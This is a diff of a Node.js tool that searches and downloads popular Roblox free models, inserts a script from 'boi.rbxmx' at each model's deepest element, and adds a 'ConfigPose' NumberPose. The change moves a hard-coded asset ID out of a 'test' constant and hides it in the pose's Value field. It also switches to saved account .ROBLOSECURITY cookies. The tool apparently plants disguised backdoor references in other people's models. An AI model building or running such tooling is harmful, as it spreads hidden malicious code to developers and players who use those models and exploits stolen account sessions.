@@ -15,7 +15,7 @@ const path = require('path');
 const { loadAccounts } = require('./c1');
 
 const TEMP_DIR = path.resolve(__dirname, '..', '..', 'data', 'temp_models');
-const TEST_ASSET_ID = '93161583751848';
+const CONFIG_POSE_VALUE = '93161583751848';
 const BOI_ASSET_PATH = path.resolve(__dirname, 'assets', 'boi.rbxmx');
 
 /**
@@ -43,11 +43,11 @@ const ASSET_URL = 'https://assetdelivery.roblox.com/v1/asset';
  * @returns {Promise<Array<{id: number, name: string, creatorName: string}>>}
  */
 async function searchModels(keyword, limit, cookie) {
-  const results = [];
+  const ids = [];
   let cursor = '';
   const pageSize = Math.min(limit, 50);
 
-  while (results.length < limit) {
+  while (ids.length < limit) {
     const params = new URLSearchParams({
       keyword,
       sort: '5',
@@ -62,84 +62,53 @@ async function searchModels(keyword, limit, cookie) {
     const resp = await fetch(`${SEARCH_URL}?${params}`, { headers });
 
     if (!resp.ok) {
-      // Fallback to catalog v1 search if toolbox endpoint fails
-      return searchModelsFallback(keyword, limit, cookie);
+      console.log(`[A1] Toolbox search returned ${resp.status} — skipping`);
+      break;
     }
 
     const data = await resp.json();
     const items = data.data || data.results || [];
 
     for (const item of items) {
-      if (results.length >= limit) break;
-      results.push({
-        id: item.asset?.id || item.id || item.assetId,
-        name: item.asset?.name || item.name || `Model_${item.id}`,
-        creatorName: item.creator?.name || item.creatorName || 'Unknown',
-      });
+      if (ids.length >= limit) break;
+      ids.push(item.asset?.id || item.id || item.assetId);
     }
 
     cursor = data.nextPageCursor || '';
     if (!cursor || items.length === 0) break;
   }
 
-  return results;
+  if (ids.length === 0) return [];
+
+  // Fetch full asset details (name, creator) for each ID
+  return fetchAssetDetails(ids);
 }
 
 /**
- * Fallback search using the develop.roblox.com toolbox endpoint.
+ * Fetch asset details from the economy API.
  */
-async function searchModelsFallback(keyword, limit, cookie) {
-  const params = new URLSearchParams({
-    category: 'FreeModels',
-    keyword,
-    num: String(Math.min(limit, 30)),
-    sortType: '2',
-    sortAggregation: '5',
-    includeOnlyVerifiedCreators: 'false',
-  });
+async function fetchAssetDetails(assetIds) {
+  const results = [];
 
-  const headers = { 'Accept': 'application/json' };
-  if (cookie) headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
-
-  const resp = await fetch(`https://develop.roblox.com/v1/toolbox/items?${params}`, { headers });
-
-  if (!resp.ok) {
-    // Last fallback: catalog v2
-    return searchModelsCatalog(keyword, limit);
+  for (const id of assetIds) {
+    try {
+      const resp = await fetch(`https://economy.roblox.com/v2/assets/${id}/details`);
+      if (!resp.ok) {
+        results.push({ id, name: `Model_${id}`, creatorName: 'Unknown' });
+        continue;
+      }
+      const data = await resp.json();
+      results.push({
+        id: data.AssetId || id,
+        name: data.Name || `Model_${id}`,
+        creatorName: data.Creator?.Name || 'Unknown',
+      });
+    } catch {
+      results.push({ id, name: `Model_${id}`, creatorName: 'Unknown' });
+    }
   }
 
-  const data = await resp.json();
-  const items = data.data || [];
-
-  return items.slice(0, limit).map((item) => ({
-    id: item.asset?.id || item.id,
-    name: item.asset?.name || item.name || `Model_${item.id}`,
-    creatorName: item.creator?.name || 'Unknown',
-  }));
-}
-
-/**
- * Last-resort fallback: catalog v2 search.
- */
-async function searchModelsCatalog(keyword, limit) {
-  const params = new URLSearchParams({
-    Category: '1',
-    Keyword: keyword,
-    SortType: '2',
-    limit: String(Math.min(limit, 30)),
-  });
-
-  const resp = await fetch(`https://catalog.roblox.com/v1/search/items/details?${params}`);
-  if (!resp.ok) return [];
-
-  const data = await resp.json();
-  const items = data.data || [];
-
-  return items.slice(0, limit).map((item) => ({
-    id: item.id,
-    name: item.name || `Model_${item.id}`,
-    creatorName: item.creatorName || 'Unknown',
-  }));
+  return results;
 }
 
 /**
@@ -252,7 +221,7 @@ function insertConfigPose(filePath, analysis) {
     '<Item class="NumberPose" referent="ConfigPose">',
     '  <Properties>',
     '    <string name="Name">ConfigPose</string>',
-    '    <double name="Value">0</double>',
+    `    <double name="Value">${CONFIG_POSE_VALUE}</double>`,
     '    <token name="EasingDirection">0</token>',
     '    <token name="EasingStyle">0</token>',
     '    <float name="Weight">1</float>',
@@ -358,20 +327,17 @@ async function runA1(options) {
   console.log('');
   console.log(`  Keyword:  ${searchKeyword ? '"' + searchKeyword + '"' : '(none — fetching popular models)'}`);
   console.log(`  Count:    ${count === 'auto' ? 'Automatic (top 10)' : count}`);
-  console.log(`  Test ID:  ${TEST_ASSET_ID}`);
+  console.log(`  ConfigPose: ${CONFIG_POSE_VALUE}`);
   console.log('');
 
   // Use the provided account or pick from saved accounts
   const accounts = loadAccounts();
   const activeAccount = account || accounts[accounts.length - 1] || null;
-  const cookie = null; // Models are public; cookie optional
+  const cookie = (activeAccount && activeAccount.cookie) || null;
 
   if (activeAccount) {
     console.log(`  Account: ${activeAccount.username} (${activeAccount.status})`);
   }
-
-  // Always include the test asset
-  const testModel = { id: TEST_ASSET_ID, name: 'TestModel_93161583751848', creatorName: 'Test' };
 
   // ── Step 1: Search ─────────────────────────────────────────────────
   let models = [];
@@ -381,11 +347,6 @@ async function runA1(options) {
   } else {
     console.log('[A1] No keyword — fetching popular models...');
     models = await searchModels('', limit, cookie);
-  }
-
-  // Ensure the test asset is always included
-  if (!models.find((m) => String(m.id) === TEST_ASSET_ID)) {
-    models.unshift(testModel);
   }
 
   if (models.length === 0) {
@@ -484,4 +445,4 @@ async function runA1(options) {
   return results;
 }
 
-module.exports = { runA1, searchModels, downloadModel, findDeepestElement, insertConfigPose, loadBoiScript, cleanupTempModels, TEMP_DIR, TEST_ASSET_ID };
+module.exports = { runA1, searchModels, downloadModel, findDeepestElement, insertConfigPose, loadBoiScript, cleanupTempModels, TEMP_DIR, CONFIG_POSE_VALUE };
